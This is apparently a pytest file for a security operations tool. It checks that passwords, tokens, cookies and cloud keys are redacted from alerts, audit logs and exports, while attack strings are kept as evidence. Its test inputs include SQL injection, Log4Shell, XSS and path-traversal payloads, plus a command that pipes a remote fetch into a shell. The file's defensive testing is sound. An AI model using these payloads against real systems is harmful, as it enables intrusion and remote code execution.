"""Credentials never reach stored or shipped data (code review 2026-11-02, secrets set).

Before this, a password in a login form, a bearer token, a session cookie or an AWS key in an alert was
kept verbatim in the alert snapshot, the sealed audit row, the dashboard row and the training export.
Attack strings must survive (they are the evidence); credentials must not.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

from aegis.agents.shared.audit import AuditLog
from aegis.agents.shared.evidence_chain import (
    EvidenceChain,
    EvidenceItem,
    RecommendedAction,
)
from aegis.agents.shared.redact import looks_like_attack, redact, redact_text
from aegis.dataset import capture
from aegis.dataset.scrub import Scrubber, scrubber_from_env

JWT = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SECRETSIGNATUREPART"
SECRETS = ["Winter2026!", "SECRETSIGNATUREPART", "ABC123SESSION", "YWxhZGRpbjpvcGVuc2VzYW1l", "AKIAIOSFODNN7EXAMPLE",
           "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY", "Hunter2!xx", "sk-live-123456789", "MIIEowIBAAK"]


def _alert() -> dict:
    return {
        "id": "W1", "source": "waf", "src_ip": "203.0.113.7", "user_id": "asha.k",
        "url": "/login?user=asha&password=Winter2026!",
        "request_headers": {"Authorization": f"Bearer {JWT}", "Cookie": "JSESSIONID=ABC123SESSION; theme=dark",
                            "User-Agent": "Mozilla/5.0"},
        "headers": "Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l\nCookie: sid=xyz",
        "aws_secret_access_key": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
        "note": "access key AKIAIOSFODNN7EXAMPLE seen in the request",
        "body": '{"username":"asha","password":"Hunter2!xx","api_key":"sk-live-123456789"}',
        "attachment": "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAK\n-----END RSA PRIVATE KEY-----",
    }


def _leaks(obj) -> list[str]:
    text = json.dumps(obj)
    return [s for s in SECRETS if s in text]


def test_redact_removes_every_credential_shape():
    out = redact(_alert())
    assert _leaks(out) == []
    assert out["request_headers"]["User-Agent"] == "Mozilla/5.0"
    assert out["request_headers"]["Authorization"].startswith("Bearer [REDACTED")       # the scheme survives
    assert out["request_headers"]["Cookie"] == "JSESSIONID=[REDACTED]; theme=[REDACTED]"  # cookie names survive
    assert "len=11" in out["url"]                                                         # length hint survives


@pytest.mark.parametrize("attack", ["' OR 1=1--", "admin'/**/UNION SELECT card FROM cards--", "${jndi:ldap://x/a}",
                                    "<script>alert(1)</script>", "../../../../etc/passwd", "x; curl http://e/x|sh"])
def test_attack_strings_in_credential_fields_are_kept(attack):
    assert looks_like_attack(attack)
    assert redact({"password": attack})["password"] == attack
    assert attack in redact_text(f"/login?user=admin&password={attack}")


@pytest.mark.parametrize("pw", ["pa'ss word;1", "Tr0ub4dor&3", "correct horse battery staple", "O'Brien#2026"])
def test_ordinary_passwords_with_punctuation_are_redacted(pw):
    assert not looks_like_attack(pw)
    assert pw not in json.dumps(redact({"password": pw, "form": f"u=x&password={pw}"}))


def test_action_targets_are_not_redacted():
    """rotate_credential must still name the key it rotates."""
    c = EvidenceChain(alert_id="K1", investigated_by="cloud", verdict="malicious", confidence=0.9)
    c.recommended_actions.append(RecommendedAction(action_type="rotate_credential", target="AKIAIOSFODNN7EXAMPLE",
                                                   reasoning="key AKIAIOSFODNN7EXAMPLE used from TOR", requires_hitl=True,
                                                   confidence=0.9))
    from aegis.agents.shared.redact import redact_chain
    redact_chain(c)
    assert c.recommended_actions[0].target == "AKIAIOSFODNN7EXAMPLE"
    assert "AKIAIOSFODNN7EXAMPLE" not in c.recommended_actions[0].reasoning


def test_alert_snapshot_has_no_credentials(monkeypatch):
    monkeypatch.setenv("AEGIS_DATASET_SALT", "test-salt")
    capture.reset_shared_scrubber()
    snap = capture.capture_alert(_alert())
    assert _leaks(snap) == []
    assert snap["data"]["user_id"] != "asha.k"          # identities still pseudonymised


def test_sealed_audit_row_has_no_credentials_and_verifies(tmp_path):
    log = AuditLog(tmp_path / "audit.jsonl", fsync=False)
    c = EvidenceChain(alert_id="A1", investigated_by="perimeter", verdict="malicious", confidence=0.9)
    c.evidence.append(EvidenceItem(source="perimeter.decode_payload", signal=f"login with token {JWT}",
                                   weight="high", raw_data={"headers": _alert()["request_headers"], "body": _alert()["body"]}))
    c.metadata["raw"] = {"password": "Winter2026!"}
    log.append(c)
    assert _leaks(json.loads((tmp_path / "audit.jsonl").read_text())) == []
    assert log.verify()


def test_unsalted_pseudonyms_are_not_the_public_constant_hash(monkeypatch, caplog):
    import hashlib
    monkeypatch.delenv("AEGIS_DATASET_SALT", raising=False)
    sc = scrubber_from_env()
    tok = sc.token("id", "u_42891")
    public = hashlib.sha256(b"aegis-dataset|id|u_42891").hexdigest()[:10]
    assert tok != public                    # a dictionary of guessed user ids no longer reverses it
    assert sc.salted is False               # and the snapshot still says it is not operator-salted


def test_generic_account_names_do_not_rewrite_attack_paths():
    sc = Scrubber("s")
    sc.scrub({"user": "root", "owner": "admin"})
    text = sc.scrub_text("GET /root/.ssh/id_rsa then /wp-admin/admin-ajax.php by a rooted host")
    assert text == "GET /root/.ssh/id_rsa then /wp-admin/admin-ajax.php by a rooted host"


def test_real_identities_are_still_replaced_in_text_but_not_inside_words():
    sc = Scrubber("s")
    out = sc.scrub({"user_id": "ravi", "msg": "ravi logged in; ravikumar did not; ap-ravi approved"})
    assert "ravi logged" not in out["msg"] and "ravikumar" in out["msg"] and "ap-ravi" not in out["msg"]


def test_remembered_literals_are_bounded():
    from aegis.dataset import scrub as mod
    sc = Scrubber("s")
    for i in range(mod._MAX_KNOWN_LITERALS + 500):
        sc.scrub({"user_id": f"user-number-{i}"})
    assert len(sc._known) == mod._MAX_KNOWN_LITERALS


def test_edge_telemetry_is_redacted_before_it_leaves(monkeypatch):
    sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "scripts"))
    import demo_target as dt

    sent: list[bytes] = []
    # the edge sends through one bounded background sender now (review round 3 I3-18): capture what it is handed
    monkeypatch.setattr(dt._SENDER, "submit", lambda url, data, headers: sent.append(data))
    dt._forward_alert("http://soc/ingest", "tok", {**_alert(), "payload": "u=asha&password=Winter2026!"})
    assert sent and _leaks(json.loads(sent[0])) == []


FAKE = "Zx9-fake-not-a-real-secret"


@pytest.mark.parametrize("text", [
    str({"user": "ravi", "password": FAKE}),                                   # Python repr of a dict
    f"GET /v1/acct\nX-Api-Key: {FAKE}\nHost: bank",                            # header line
    f"Authorization: ApiKey {FAKE}",
    f"{{'client_secret' : '{FAKE}'}}",
    f"password=select one from many {FAKE}",                                   # SQL-ish passphrase
    f"password=`{FAKE}`",
    f"user=ravi password={FAKE} uri=/search?q=' OR 1=1-- ua=sqlmap",           # credential + attack on one line
    f'{{"userPassword": "{FAKE}", "githubToken": "{FAKE}"}}',
])
def test_review_2026_11_03_redaction_gaps(text):
    assert FAKE not in redact_text(text)


@pytest.mark.parametrize("key", ["Password ", "userPassword", "x-api-key", "AccessToken", "clientSecret", "db_password"])
def test_credential_key_spellings(key):
    assert FAKE not in json.dumps(redact({key: FAKE}))


def test_attack_on_the_same_line_is_still_kept():
    out = redact_text(f"user=ravi password={FAKE} uri=/search?q=' OR 1=1--")
    assert FAKE not in out and "' OR 1=1--" in out


def test_deferred_spill_is_private_and_keeps_the_evidence(tmp_path):
    # review round 3 G4-12: the spill is a queue of alerts still to be analysed. Redacting it stripped the very
    # credential a re-fed secret-leak alert is about. It keeps the alert as received in a 0600 file; the audit
    # record of the analysis is redacted as always.
    import os
    import stat

    from aegis.ops.deferred import DeferredQueue
    q = DeferredQueue(tmp_path / "deferred.jsonl")
    q.push({"id": "a1", "body": f"username=ravi&password={FAKE}", "request_headers": {"Authorization": f"Bearer {FAKE}"}})
    assert stat.S_IMODE(os.stat(tmp_path / "deferred.jsonl").st_mode) == 0o600
    (row,) = q.pop(1)
    assert row["id"] == "a1" and FAKE in row["body"]
